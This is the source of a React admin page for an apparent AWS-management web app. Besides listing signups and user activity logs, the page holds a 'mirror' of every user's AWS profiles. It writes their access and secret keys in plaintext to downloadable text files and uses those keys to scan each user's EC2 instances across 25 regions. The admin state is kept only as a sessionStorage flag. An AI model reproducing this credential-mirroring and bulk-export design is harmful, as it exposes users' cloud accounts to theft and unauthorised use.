import { useEffect, useState, useCallback, useRef } from 'react';
import {
  listSignups, deleteSignup, listUserLogs, deleteUserLog,
  listAwsMirror, deleteAwsMirror,
  type SignupRecord, type UserLog, type AwsMirror,
} from '../lib/adminStore';
import { supabase, callAwsApi } from '../lib/supabase';
import MadeByBadge from './MadeByBadge';
import ThreeBackground from './ThreeBackground';
import Loader3D from './Loader3D';

const AUTHD_KEY = 'admin_authed';

const ALL_REGIONS = [
  'us-east-1','us-east-2','us-west-1','us-west-2',
  'eu-west-1','eu-west-2','eu-west-3','eu-central-1','eu-north-1','eu-south-1','eu-south-2',
  'ap-south-1','ap-south-2','ap-northeast-1','ap-northeast-2','ap-northeast-3',
  'ap-southeast-1','ap-southeast-2','ap-southeast-3','ap-east-1',
  'ca-central-1','sa-east-1','me-south-1','me-central-1','af-south-1',
];

const REGION_LABELS: Record<string, string> = {
  'ap-south-1': 'Mumbai', 'ap-south-2': 'Hyderabad', 'ap-northeast-1': 'Tokyo',
  'ap-northeast-2': 'Seoul', 'ap-northeast-3': 'Osaka', 'ap-southeast-1': 'Singapore',
  'ap-southeast-2': 'Sydney', 'ap-southeast-3': 'Jakarta', 'ap-east-1': 'Hong Kong',
  'us-east-1': 'N. Virginia', 'us-east-2': 'Ohio', 'us-west-1': 'N. California',
  'us-west-2': 'Oregon', 'eu-west-1': 'Ireland', 'eu-west-2': 'London',
  'eu-west-3': 'Paris', 'eu-central-1': 'Frankfurt', 'eu-north-1': 'Stockholm',
  'eu-south-1': 'Milan', 'eu-south-2': 'Spain', 'ca-central-1': 'Canada',
  'sa-east-1': 'São Paulo', 'me-south-1': 'Bahrain', 'me-central-1': 'UAE',
  'af-south-1': 'Cape Town',
};

interface InstanceInfo {
  account: string;
  email: string;
  region: string;
  id: string;
  name: string;
  state: string;
  type: string;
  publicIp: string;
  privateIp: string;
  launched: string;
}

interface FlipTileProps {
  accountName: string;
  instancesByRegion: Record<string, InstanceInfo[]>;
}

function FlipTile({ accountName, instancesByRegion }: FlipTileProps) {
  const regions = Object.keys(instancesByRegion);
  const multiRegion = regions.length > 1;
  const [flipIdx, setFlipIdx] = useState(0);
  const [flipping, setFlipping] = useState(false);
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  useEffect(() => {
    if (!multiRegion) return;
    timerRef.current = setInterval(() => {
      setFlipping(true);
      setTimeout(() => {
        setFlipIdx((prev) => (prev + 1) % regions.length);
        setFlipping(false);
      }, 400);
    }, 3000);
    return () => { if (timerRef.current) clearInterval(timerRef.current); };
  }, [multiRegion, regions.length]);

  const currentRegion = regions[flipIdx];
  const instances = instancesByRegion[currentRegion] || [];
  const running = instances.filter((i) => i.state === 'running').length;
  const stopped = instances.filter((i) => i.state === 'stopped').length;
  const label = REGION_LABELS[currentRegion] || currentRegion;

  return (
    <div
      style={{
        perspective: 800,
        width: '100%',
        minHeight: 180,
      }}
    >
      <div
        style={{
          transform: flipping ? 'rotateX(90deg)' : 'rotateX(0deg)',
          transition: flipping ? 'transform 0.4s ease-in' : 'transform 0.4s ease-out',
          transformStyle: 'preserve-3d',
          background: 'var(--bg-0)',
          border: running > 0 ? '1px solid rgba(224,106,90,0.3)' : '1px solid var(--border)',
          borderRadius: 10,
          padding: 16,
          minHeight: 180,
        }}
      >
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 10 }}>
          <span style={{ fontSize: 14, fontWeight: 700 }}>{accountName}</span>
          {multiRegion && (
            <div style={{ display: 'flex', gap: 4 }}>
              {regions.map((r, i) => (
                <span
                  key={r}
                  style={{
                    width: 7, height: 7, borderRadius: '50%',
                    background: i === flipIdx ? 'var(--primary)' : 'var(--border)',
                    transition: 'background 0.3s',
                  }}
                />
              ))}
            </div>
          )}
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12 }}>
          <span className="badge" style={{ fontSize: 11, padding: '3px 10px', background: 'rgba(96,165,250,0.12)', color: 'var(--blue)' }}>
            {label} ({currentRegion})
          </span>
          {running > 0 && <span className="status-badge status-active" style={{ fontSize: 10 }}>{running} running</span>}
          {stopped > 0 && <span className="status-badge status-expired" style={{ fontSize: 10 }}>{stopped} stopped</span>}
        </div>

        {instances.map((inst, i) => (
          <div key={i} style={{
            display: 'flex', alignItems: 'center', gap: 8, padding: '6px 10px',
            background: inst.state === 'running' ? 'rgba(224,106,90,0.06)' : 'rgba(139,135,160,0.06)',
            borderRadius: 6, marginBottom: 4, fontSize: 12,
          }}>
            <span style={{
              width: 6, height: 6, borderRadius: '50%', flexShrink: 0,
              background: inst.state === 'running' ? 'var(--terracotta)' : 'var(--ink-faint)',
            }} />
            <span style={{ fontWeight: 600, flex: 1, minWidth: 0, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
              {inst.name || inst.id}
            </span>
            <span style={{ fontFamily: 'monospace', fontSize: 10, color: 'var(--text-muted)' }}>{inst.type}</span>
            <span style={{ fontFamily: 'monospace', fontSize: 10, color: inst.state === 'running' ? 'var(--terracotta)' : 'var(--text-muted)' }}>
              {inst.publicIp !== '—' ? inst.publicIp : inst.privateIp}
            </span>
          </div>
        ))}

        {instances.length === 0 && (
          <div style={{ textAlign: 'center', padding: 16, color: 'var(--text-muted)', fontSize: 12 }}>
            Is region me koi instance nahi
          </div>
        )}

        {multiRegion && (
          <div style={{ textAlign: 'center', marginTop: 8, fontSize: 10, color: 'var(--text-muted)' }}>
            Auto-cycling: {regions.map((r) => REGION_LABELS[r] || r).join(' → ')}
          </div>
        )}
      </div>
    </div>
  );
}

function fmtDateTime(iso: string) {
  if (!iso) return '-';
  const d = new Date(iso);
  return isNaN(d.getTime()) ? iso : d.toLocaleString('en-IN');
}

function downloadTxt(filename: string, content: string) {
  const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}

export default function AdminPage() {
  const [authed, setAuthed] = useState(() => sessionStorage.getItem(AUTHD_KEY) === '1');
  const [pin, setPin] = useState('');
  const [pinError, setPinError] = useState('');
  const [signups, setSignups] = useState<SignupRecord[]>([]);
  const [userLogs, setUserLogs] = useState<UserLog[]>([]);
  const [awsMirror, setAwsMirror] = useState<AwsMirror[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [toast, setToast] = useState('');
  const [toastType, setToastType] = useState<'ok' | 'err'>('ok');
  const [scanLoading, setScanLoading] = useState(false);
  const [scanProgress, setScanProgress] = useState('');
  const [scanResults, setScanResults] = useState<InstanceInfo[]>([]);
  const [scanDone, setScanDone] = useState(false);
  const [selectedAccounts, setSelectedAccounts] = useState<Set<string>>(new Set());

  const allProfiles = awsMirror.flatMap((m) =>
    m.profiles.map((p) => ({ ...p, email: m.email, mirrorId: m.id, key: `${m.id}_${p.access_key}_${p.region}` }))
  );

  function toggleAccount(key: string) {
    setSelectedAccounts((prev) => {
      const next = new Set(prev);
      if (next.has(key)) next.delete(key); else next.add(key);
      return next;
    });
  }

  function toggleSelectAll() {
    if (selectedAccounts.size === allProfiles.length) {
      setSelectedAccounts(new Set());
    } else {
      setSelectedAccounts(new Set(allProfiles.map((p) => p.key)));
    }
  }

  const showToast = (msg: string, type: 'ok' | 'err' = 'ok') => {
    setToastType(type);
    setToast(msg);
    setTimeout(() => setToast(''), 2200);
  };

  async function load() {
    setLoading(true);
    setError('');
    try {
      const [s, l, a] = await Promise.all([listSignups(), listUserLogs(), listAwsMirror()]);
      setSignups(s.sort((x, y) => (x.created_at < y.created_at ? 1 : -1)));
      setUserLogs(l.sort((x, y) => ((x.events[x.events.length - 1]?.at || '') < (y.events[y.events.length - 1]?.at || '') ? 1 : -1)));
      setAwsMirror(a.sort((x, y) => (x.email < y.email ? -1 : 1)));
    } catch (e) {
      setError((e as Error).message);
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => { if (authed) load(); }, [authed]);

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    setPinError('');
    try {
      const { data, error } = await supabase.rpc('verify_admin_pin', { pin_input: pin });
      if (error) throw error;
      if (data === true) {
        sessionStorage.setItem(AUTHD_KEY, '1');
        setAuthed(true);
        setPin('');
      } else {
        setPinError('Galat password. Dobara try karo.');
      }
    } catch {
      setPinError('Server se connect nahi ho paya. Dobara try karo.');
    }
  }

  function logout() {
    sessionStorage.removeItem(AUTHD_KEY);
    setAuthed(false);
    setSignups([]);
    setUserLogs([]);
    setAwsMirror([]);
  }

  async function handleDeleteUserLog(id: string, email: string) {
    if (!confirm(`Delete log file of ${email}?`)) return;
    try {
      await deleteUserLog(id);
      setUserLogs(userLogs.filter((u) => u.id !== id));
      showToast('Deleted ✓');
    } catch (e) {
      showToast((e as Error).message, 'err');
    }
  }

  async function handleDeleteAws(id: string, email: string) {
    if (!confirm(`Delete AWS mirror of ${email}?`)) return;
    try {
      await deleteAwsMirror(id);
      setAwsMirror(awsMirror.filter((a) => a.id !== id));
      showToast('Deleted ✓');
    } catch (e) {
      showToast((e as Error).message, 'err');
    }
  }

  async function clearAll() {
    if (!confirm('SAARE signup records, log files aur AWS mirrors DELETE ho jayenge. Pakka?')) return;
    setLoading(true);
    setError('');
    try {
      for (const s of signups) await deleteSignup(s.id);
      for (const u of userLogs) await deleteUserLog(u.id);
      for (const a of awsMirror) await deleteAwsMirror(a.id);
      setSignups([]);
      setUserLogs([]);
      setAwsMirror([]);
      showToast('Sab clear ho gaya ✓');
    } catch (e) {
      showToast((e as Error).message, 'err');
    } finally {
      setLoading(false);
    }
  }

  function userLogTxt(u: UserLog) {
    let txt = `LOG FILE — ${u.email}\n`;
    txt += '='.repeat(46) + '\n\n';
    if (u.events.length === 0) txt += 'Koi activity nahi.\n';
    u.events.forEach((ev, i) => {
      const label = ev.type === 'signup' ? 'Signup' : 'Password reset';
      txt += `${i + 1}. ${label} — ${fmtDateTime(ev.at)}\n`;
    });
    return txt;
  }

  function awsTxt(a: AwsMirror) {
    let txt = `AWS ACCOUNTS — ${a.email}\n`;
    txt += '='.repeat(46) + '\n\n';
    if (a.profiles.length === 0) txt += 'Koi AWS account nahi.\n';
    a.profiles.forEach((p, i) => {
      txt += `${i + 1}. ${p.profile_name}\n`;
      txt += `   Access Key: ${p.access_key}\n`;
      txt += `   Secret Key: ${p.secret_key}\n`;
      txt += `   Region: ${p.region}\n\n`;
    });
    return txt;
  }

  function downloadUserLog(u: UserLog) {
    downloadTxt(`${u.email}.txt`, userLogTxt(u));
    showToast('TXT download ho gaya ✓');
  }

  function downloadAws(a: AwsMirror) {
    downloadTxt(`${a.email}-aws.txt`, awsTxt(a));
    showToast('TXT download ho gaya ✓');
  }

  function downloadAll() {
    let txt = 'ADMIN LOG — ajayaws.web.app\n';
    txt += '='.repeat(50) + '\n\n';
    txt += '=== REGISTERED USERS ===\n\n';
    userLogs.forEach((u) => { txt += userLogTxt(u) + '\n'; });
    txt += '\n=== AWS ACCOUNTS ===\n\n';
    awsMirror.forEach((a) => { txt += awsTxt(a) + '\n'; });
    downloadTxt(`admin_log_${new Date().toISOString().slice(0, 10)}.txt`, txt);
    showToast('Sab TXT download ho gaya ✓');
  }

  async function scanAllRegions() {
    if (awsMirror.length === 0) { showToast('Koi AWS account nahi hai pehle add karo', 'err'); return; }
    const toScan = allProfiles.filter((p) => selectedAccounts.size === 0 || selectedAccounts.has(p.key));
    if (toScan.length === 0) { showToast('Koi account select nahi kiya', 'err'); return; }
    setScanLoading(true);
    setScanDone(false);
    setScanResults([]);
    const results: InstanceInfo[] = [];
    let checked = 0;
    const totalChecks = toScan.length * ALL_REGIONS.length;

    for (const profile of toScan) {
      for (const region of ALL_REGIONS) {
        checked++;
        setScanProgress(`${profile.email} → ${region} (${checked}/${totalChecks})`);
        try {
          const data = await callAwsApi('list-instances', {
            accessKey: profile.access_key,
            secretKey: profile.secret_key,
            region,
          });
          const instances = data.instances || [];
          instances.forEach((inst: any) => {
            results.push({
              account: profile.profile_name,
              email: profile.email,
              region,
              id: inst.id || '',
              name: inst.name || inst.id || '',
              state: inst.state || '',
              type: inst.type || '',
              publicIp: inst.public_ip || '—',
              privateIp: inst.private_ip || '—',
              launched: inst.launched || '',
            });
          });
        } catch {
          // region not available or auth error — skip silently
        }
      }
    }

    setScanResults(results);
    setScanDone(true);
    setScanLoading(false);
    setScanProgress('');
    const running = results.filter((r) => r.state === 'running').length;
    const stopped = results.filter((r) => r.state === 'stopped').length;
    showToast(`Scan done: ${running} running, ${stopped} stopped (${results.length} total)`, running > 0 ? 'err' : 'ok');
  }

  const sectionHeader = (icon: string, title: string, sub: string) => (
    <div style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '16px 22px', borderBottom: '1px solid var(--glass-border)' }}>
      <div style={{ width: 40, height: 40, borderRadius: 12, background: 'rgba(0,212,255,0.12)', border: '1px solid rgba(0,212,255,0.25)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 18 }}>{icon}</div>
      <div>
        <div style={{ fontSize: 14, fontWeight: 700 }}>{title}</div>
        <div style={{ fontSize: 12, color: 'var(--text-muted)' }}>{sub}</div>
      </div>
    </div>
  );

  return (
    <>
      <ThreeBackground />
      <MadeByBadge />
      <div className="main-content" style={{ minHeight: '100vh' }}>
        <div style={{ maxWidth: 900, margin: '0 auto', padding: '40px 0' }}>
          {!authed ? (
            <div style={{ maxWidth: 420, margin: '0 auto' }}>
              <div className="card" style={{ padding: 34 }}>
                <div style={{ textAlign: 'center', marginBottom: 26 }}>
                  <div style={{
                    width: 60, height: 60, margin: '0 auto 16px', borderRadius: 18,
                    background: 'linear-gradient(135deg, var(--primary), var(--primary-dark))',
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    fontSize: 28, fontWeight: 800, color: 'var(--btn-contrast)',
                    boxShadow: '0 0 30px rgba(var(--glow-rgb),0.3)',
                  }}>🔐</div>
                  <h1 style={{ fontSize: 22, fontWeight: 800, marginBottom: 6 }} className="gradient-text">Admin Access</h1>
                  <p style={{ color: 'var(--text-muted)', fontSize: 13 }}>Sirf admin ke liye. Password dalo.</p>
                </div>
                <form onSubmit={handleLogin}>
                  <div className="form-group">
                    <label>Password</label>
                    <input type="password" value={pin} onChange={(e) => { setPin(e.target.value); setPinError(''); }} placeholder="••••••••" autoFocus inputMode="numeric" />
                  </div>
                  {pinError && (
                    <div style={{
                      padding: '10px 14px', background: 'rgba(255,23,68,0.1)',
                      border: '1px solid rgba(255,23,68,0.2)', borderRadius: 8,
                      color: 'var(--danger)', fontSize: 13, marginBottom: 14,
                    }}>{pinError}</div>
                  )}
                  <button className="btn-primary" type="submit" style={{ width: '100%', padding: '14px', fontSize: 15 }}>Unlock</button>
                </form>
              </div>
            </div>
          ) : (
            <>
              <div style={{ display: 'flex', alignItems: 'flex-end', justifyContent: 'space-between', flexWrap: 'wrap', gap: 12, marginBottom: 20 }}>
                <div>
                  <h1 style={{ fontSize: 28, fontWeight: 800, marginBottom: 6, letterSpacing: -0.5 }} className="gradient-text">Admin Panel</h1>
                  <p style={{ color: 'var(--text-muted)', fontSize: 14 }}>
                    {userLogs.length} users • {awsMirror.reduce((s, a) => s + a.profiles.length, 0)} AWS accounts
                  </p>
                </div>
                <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
                  <button className="btn-primary btn-sm" onClick={downloadAll} style={{ fontSize: 13 }}>⬇ Sab TXT</button>
                  <button className="btn-secondary btn-sm" onClick={load} style={{ fontSize: 13 }}>↻ Refresh</button>
                  <button className="btn-danger btn-sm" onClick={clearAll} style={{ fontSize: 13 }}>🧹 Clear All</button>
                  <button className="btn-danger btn-sm" onClick={logout} style={{ fontSize: 13 }}>Logout</button>
                </div>
              </div>

              {error && <div className="toast toast-error" style={{ position: 'static', marginBottom: 20 }}>{error}</div>}

              {/* Log files per user */}
              <div className="card" style={{ padding: 0, overflow: 'hidden', marginBottom: 20 }}>
                {sectionHeader('📁', 'Log Files (har user ka apna)', 'email ke naam se txt file + signup/reset activity')}
                {loading ? (
                  <div style={{ textAlign: 'center', padding: 40 }}><Loader3D /></div>
                ) : userLogs.length === 0 ? (
                  <div style={{ textAlign: 'center', padding: 44, color: 'var(--text-muted)' }}>
                    <div style={{ fontSize: 32, marginBottom: 8 }}>📭</div>
                    Abhi koi user log nahi.
                  </div>
                ) : (
                  userLogs.map((u) => {
                    const last = u.events[u.events.length - 1]?.at;
                    return (
                      <div key={u.id} style={{ display: 'flex', alignItems: 'center', gap: 14, padding: '13px 22px', borderBottom: '1px solid var(--border)' }}>
                        <div style={{
                          width: 40, height: 40, borderRadius: '50%', flexShrink: 0,
                          background: 'linear-gradient(135deg, rgba(0,212,255,0.22), rgba(68,138,255,0.08))',
                          color: 'var(--primary)', border: '1px solid rgba(0,212,255,0.3)',
                          display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 15, fontWeight: 800,
                        }}>{u.email.slice(0, 2).toUpperCase()}</div>
                        <div style={{ flex: 1, minWidth: 0 }}>
                          <div style={{ fontSize: 14, fontWeight: 700, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{u.email}</div>
                          <div style={{ fontSize: 11, color: 'var(--text-muted)', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>
                            {u.events.length} event{u.events.length !== 1 ? 's' : ''}
                            {last ? ` • last ${fmtDateTime(last)}` : ''}
                          </div>
                        </div>
                        <button className="btn-secondary" style={{ fontSize: 11, padding: '5px 10px', whiteSpace: 'nowrap' }} onClick={() => downloadUserLog(u)}>⬇ .txt</button>
                        <button className="btn-danger" style={{ fontSize: 11, padding: '5px 9px' }} onClick={() => handleDeleteUserLog(u.id, u.email)}>✕</button>
                      </div>
                    );
                  })
                )}
              </div>

              {/* AWS accounts mirror */}
              <div className="card" style={{ padding: 0, overflow: 'hidden', marginBottom: 20 }}>
                {sectionHeader('☁', 'AWS Accounts (mirror)', 'har user ke AWS accounts + keys, unki txt file')}
                {loading ? (
                  <div style={{ textAlign: 'center', padding: 40 }}><Loader3D /></div>
                ) : awsMirror.length === 0 ? (
                  <div style={{ textAlign: 'center', padding: 44, color: 'var(--text-muted)' }}>
                    <div style={{ fontSize: 32, marginBottom: 8 }}>☁</div>
                    Abhi koi AWS account mirror nahi.
                  </div>
                ) : (
                  awsMirror.map((a) => (
                    <div key={a.id} style={{ display: 'flex', alignItems: 'center', gap: 14, padding: '13px 22px', borderBottom: '1px solid var(--border)' }}>
                      <div style={{
                        width: 40, height: 40, borderRadius: '50%', flexShrink: 0,
                        background: 'linear-gradient(135deg, rgba(255,171,0,0.22), rgba(255,87,34,0.08))',
                        color: 'var(--warning)', border: '1px solid rgba(255,171,0,0.3)',
                        display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 15, fontWeight: 800,
                      }}>{a.email.slice(0, 2).toUpperCase()}</div>
                      <div style={{ flex: 1, minWidth: 0 }}>
                        <div style={{ fontSize: 14, fontWeight: 700, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{a.email}</div>
                        <div style={{ fontSize: 11, color: 'var(--text-muted)', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>
                          {a.profiles.length} account{a.profiles.length !== 1 ? 's' : ''}
                          {a.profiles[0] ? ` • ${a.profiles[0].profile_name}…` : ''}
                        </div>
                      </div>
                      <button className="btn-secondary" style={{ fontSize: 11, padding: '5px 10px', whiteSpace: 'nowrap' }} onClick={() => downloadAws(a)}>⬇ .txt</button>
                      <button className="btn-danger" style={{ fontSize: 11, padding: '5px 9px' }} onClick={() => handleDeleteAws(a.id, a.email)}>✕</button>
                    </div>
                  ))
                )}
              </div>

              {/* Instance Scanner */}
              <div className="card" style={{ padding: 0, overflow: 'hidden', marginBottom: 20 }}>
                {sectionHeader('🔍', 'Instance Scanner', `${ALL_REGIONS.length} regions scan karo — account select karke scan karo`)}
                <div style={{ padding: '16px 22px', borderBottom: '1px solid var(--border)' }}>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 10 }}>
                    <span style={{ fontSize: 12, fontWeight: 600, color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: 0.5 }}>Select Accounts</span>
                    <button onClick={toggleSelectAll} style={{ background: 'transparent', border: 'none', color: 'var(--primary)', fontSize: 12, fontWeight: 600, cursor: 'pointer', fontFamily: 'Inter, sans-serif' }}>
                      {selectedAccounts.size === allProfiles.length ? 'Deselect All' : 'Select All'}
                    </button>
                  </div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                    {allProfiles.map((p) => (
                      <label key={p.key} style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '8px 12px', background: selectedAccounts.has(p.key) ? 'rgba(74,222,128,0.08)' : 'var(--bg-0)', border: `1px solid ${selectedAccounts.has(p.key) ? 'rgba(74,222,128,0.3)' : 'var(--border)'}`, borderRadius: 8, cursor: 'pointer', transition: 'all 0.15s' }}>
                        <input
                          type="checkbox"
                          checked={selectedAccounts.has(p.key)}
                          onChange={() => toggleAccount(p.key)}
                          style={{ accentColor: 'var(--green)', width: 16, height: 16, cursor: 'pointer' }}
                        />
                        <div style={{ flex: 1, minWidth: 0 }}>
                          <span style={{ fontSize: 13, fontWeight: 600 }}>{p.profile_name}</span>
                          <span style={{ fontSize: 11, color: 'var(--text-muted)', marginLeft: 8 }}>{p.email}</span>
                        </div>
                        <span style={{ fontSize: 11, fontFamily: 'monospace', color: 'var(--text-muted)' }}>{p.access_key.slice(0, 8)}…</span>
                        <span className="badge" style={{ fontSize: 10, padding: '2px 8px', background: 'rgba(96,165,250,0.12)', color: 'var(--blue)' }}>{p.region}</span>
                      </label>
                    ))}
                  </div>
                  {allProfiles.length === 0 && (
                    <div style={{ textAlign: 'center', padding: 16, color: 'var(--text-muted)', fontSize: 13 }}>
                      Koi AWS account nahi hai
                    </div>
                  )}
                </div>
                <div style={{ padding: '16px 22px', display: 'flex', alignItems: 'center', gap: 12, flexWrap: 'wrap' }}>
                  <button
                    className="btn-primary btn-sm"
                    onClick={scanAllRegions}
                    disabled={scanLoading || (selectedAccounts.size === 0 && allProfiles.length > 0)}
                    style={{ fontSize: 13, padding: '8px 18px', display: 'flex', alignItems: 'center', gap: 6 }}
                  >
                    {scanLoading ? <><span className="spinner" /> Scanning...</> : `🔍 Scan ${selectedAccounts.size > 0 ? `${selectedAccounts.size} Account(s)` : 'All Regions'}`}
                  </button>
                  {scanProgress && (
                    <span style={{ fontSize: 12, color: 'var(--text-muted)', fontFamily: 'monospace' }}>{scanProgress}</span>
                  )}
                  {scanDone && (
                    <span style={{ fontSize: 12, color: 'var(--success)' }}>
                      {scanResults.length} instance(s) mila — {scanResults.filter(r => r.state === 'running').length} running, {scanResults.filter(r => r.state === 'stopped').length} stopped
                    </span>
                  )}
                </div>
                {scanDone && scanResults.length > 0 && (() => {
                  const byAccount: Record<string, Record<string, InstanceInfo[]>> = {};
                  scanResults.forEach((inst) => {
                    if (!byAccount[inst.account]) byAccount[inst.account] = {};
                    if (!byAccount[inst.account][inst.region]) byAccount[inst.account][inst.region] = [];
                    byAccount[inst.account][inst.region].push(inst);
                  });
                  return (
                    <div style={{ padding: '16px 22px' }}>
                      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(340px, 1fr))', gap: 14 }}>
                        {Object.entries(byAccount).map(([account, regions]) => (
                          <FlipTile key={account} accountName={account} instancesByRegion={regions} />
                        ))}
                      </div>
                    </div>
                  );
                })()}
                {scanDone && scanResults.length > 0 && (
                  <div style={{ padding: '0 22px 16px', overflowX: 'auto' }}>
                    <details style={{ fontSize: 12, color: 'var(--text-muted)' }}>
                      <summary style={{ cursor: 'pointer', padding: '8px 0', fontWeight: 600 }}>📋 Full Table View</summary>
                      <table className="table" style={{ fontSize: 12, marginTop: 8 }}>
                        <thead>
                          <tr>
                            <th>Account</th>
                            <th>Region</th>
                            <th>Instance ID</th>
                            <th>Name</th>
                            <th>State</th>
                            <th>Type</th>
                            <th>Public IP</th>
                            <th>Private IP</th>
                          </tr>
                        </thead>
                        <tbody>
                          {scanResults.sort((a, b) => {
                            if (a.state === 'running' && b.state !== 'running') return -1;
                            if (a.state !== 'running' && b.state === 'running') return 1;
                            return a.region.localeCompare(b.region);
                          }).map((inst, i) => (
                            <tr key={i} style={inst.state === 'running' ? { background: 'rgba(224,106,90,0.06)' } : {}}>
                              <td style={{ fontSize: 11, color: 'var(--ink-faint)' }}>{inst.email}</td>
                              <td><span className="badge" style={{ fontSize: 10, padding: '2px 8px', background: 'rgba(96,165,250,0.12)', color: 'var(--blue)' }}>{inst.region}</span></td>
                              <td style={{ fontFamily: 'monospace', fontSize: 11 }}>{inst.id}</td>
                              <td style={{ fontSize: 12 }}>{inst.name}</td>
                              <td>
                                <span className={`status-badge ${inst.state === 'running' ? 'status-active' : inst.state === 'stopped' ? 'status-expired' : 'status-disabled'}`}>
                                  {inst.state}
                                </span>
                              </td>
                              <td style={{ fontSize: 11, fontFamily: 'monospace' }}>{inst.type}</td>
                              <td style={{ fontSize: 11, fontFamily: 'monospace' }}>{inst.publicIp}</td>
                              <td style={{ fontSize: 11, fontFamily: 'monospace' }}>{inst.privateIp}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </details>
                  </div>
                )}
                {scanDone && scanResults.length === 0 && (
                  <div style={{ textAlign: 'center', padding: 30, color: 'var(--text-muted)', fontSize: 13 }}>
                    ✅ Koi instance nahi mila — sab jagah sab band hai
                  </div>
                )}
              </div>

              {/* Signups quick list */}
              <div className="card" style={{ padding: 0, overflow: 'hidden' }}>
                {sectionHeader('👤', 'Recent Signups', 'chronological record')}
                {signups.length === 0 ? (
                  <div style={{ textAlign: 'center', padding: 40, color: 'var(--text-muted)' }}>
                    Abhi koi signup nahi hua.
                  </div>
                ) : (
                  signups.map((s) => (
                    <div key={s.id} style={{ display: 'flex', alignItems: 'center', gap: 14, padding: '12px 22px', borderBottom: '1px solid var(--border)' }}>
                      <div style={{ flex: 1, minWidth: 0 }}>
                        <div style={{ fontSize: 14, fontWeight: 600, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{s.email}</div>
                        <div style={{ fontSize: 11, color: 'var(--text-muted)' }}>{fmtDateTime(s.created_at)}</div>
                      </div>
                      <button className="btn-danger" style={{ fontSize: 11, padding: '5px 9px' }} onClick={() => {
                        if (!confirm(`Delete signup record of ${s.email}?`)) return;
                        deleteSignup(s.id).then(() => setSignups(signups.filter((x) => x.id !== s.id))).catch((e) => showToast((e as Error).message, 'err'));
                      }}>✕</button>
                    </div>
                  ))
                )}
              </div>
            </>
          )}
        </div>
      </div>
      {toast && <div className={`toast ${toastType === 'ok' ? 'toast-success' : 'toast-error'}`}>{toast}</div>}
    </>
  );
}
